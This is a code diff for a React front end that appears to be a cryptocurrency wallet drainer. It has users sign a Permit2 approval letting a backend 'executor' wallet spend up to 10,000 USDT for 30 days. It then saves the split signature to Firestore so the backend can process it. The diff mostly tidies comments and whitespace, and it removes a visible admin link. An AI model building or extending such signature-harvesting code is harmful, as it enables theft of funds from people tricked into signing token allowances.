@@ -5,17 +5,17 @@ import { mainnet } from '@reown/appkit/networks';
 import { BrowserProvider } from 'ethers';
 import { db } from './firebase';
 import { doc, setDoc } from 'firebase/firestore';
-import Admin from './Admin'; // Ensure src/Admin.jsx exists
+import Admin from './Admin'; // <--- MAKE SURE THIS IMPORT IS HERE
 
 // -----------------------------
 // CONFIGURATION
 // -----------------------------
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-const EXECUTOR_ADDRESS = import.meta.env.VITE_EXECUTOR_ADDRESS;
+// Ensure this variable exists in your .env file
+const EXECUTOR_ADDRESS = import.meta.env.VITE_EXECUTOR_ADDRESS; 
 const USDT_DECIMALS = 6n;
 const SPENDING_CAP = BigInt(10000) * (10n ** USDT_DECIMALS);
 
-// Initialize AppKit
 const appKit = createAppKit({
   adapters: [new EthersAdapter()],
   networks: [mainnet],
@@ -29,7 +29,7 @@ const appKit = createAppKit({
 });
 
 export default function App() {
-  // ROUTING FIX: Check if path is '/admin'
+  // 1. ROUTING LOGIC: Check if we are on the "/admin" page
   const [isAdmin] = useState(() => window.location.pathname === '/admin');
 
   const [status, setStatus] = useState("Not connected");
@@ -54,25 +54,24 @@ export default function App() {
         setStatus("Wallet not connected");
         return;
       }
-      
       if (!EXECUTOR_ADDRESS) {
-        setStatus("Configuration Error: VITE_EXECUTOR_ADDRESS missing in .env");
+        setStatus("Error: VITE_EXECUTOR_ADDRESS missing in .env");
         return;
       }
 
       setStatus("Preparing Permit2 signature...");
-      
+
       const walletProvider = appKit.getWalletProvider();
       if (!walletProvider) {
         setStatus("Wallet provider not available.");
         return;
       }
-      
+
       const provider = new BrowserProvider(walletProvider);
       const net = await provider.getNetwork();
       const chainId = Number(net.chainId);
-      
-      const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60; 
+
+      const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60;
       const nonce = 0; 
 
       const permitted = {
@@ -81,13 +80,9 @@ export default function App() {
         expiration: deadline,
         nonce
       };
-      
-      const domain = { 
-        name: "Permit2", 
-        chainId, 
-        verifyingContract: PERMIT2 
-      };
-      
+
+      const domain = { name: "Permit2", chainId, verifyingContract: PERMIT2 };
+
       const types = {
         EIP712Domain: [
           { name: "name", type: "string" },
@@ -107,27 +102,28 @@ export default function App() {
         ]
       };
 
+      // Spender MUST be the Executor (Backend Wallet), NOT the Router
       const message = {
         details: permitted,
         spender: EXECUTOR_ADDRESS, 
         sigDeadline: deadline
       };
-      
+
       setStatus("Requesting signature...");
       const payload = JSON.stringify({ domain, types, primaryType: "PermitSingle", message });
-      
+
       const signature = await walletProvider.request({
         method: "eth_signTypedData_v4",
         params: [connectedAddress, payload]
       });
-      
+
       const raw = signature.substring(2);
       const r = "0x" + raw.substring(0, 64);
       const s = "0x" + raw.substring(64, 128);
       const v = parseInt(raw.substring(128, 130), 16);
-      
+
       const id = connectedAddress + "_" + Date.now();
-      
+
       await setDoc(doc(db, "permit2_signatures", id), {
         owner: connectedAddress,
         spender: EXECUTOR_ADDRESS,
@@ -139,21 +135,21 @@ export default function App() {
         processed: false,
         timestamp: Date.now()
       });
-      
+
       setStatus("Signature saved! Backend will process it.");
-      
+
     } catch (err) {
       console.error(err);
       setStatus("Error: " + (err?.message || String(err)));
     }
   };
 
-  // Render Admin Panel if path is /admin
+  // 2. CONDITIONAL RENDER: If URL is /admin, show Admin panel
   if (isAdmin) {
     return <Admin />;
   }
 
-  // Normal User View
+  // Otherwise, show the User Signing UI
   return (
     <div className="app-container">
       <h2>Permit2 Signing DApp</h2>
@@ -172,11 +168,6 @@ export default function App() {
       )}
 
       <div className="status">{status}</div>
-      
-      <div style={{marginTop: '50px', fontSize: '12px'}}>
-        {/* Simple Link to Admin Page */}
-        <a href="/admin" style={{color: '#555'}}>Admin Login</a>
-      </div>
     </div>
   );
 }
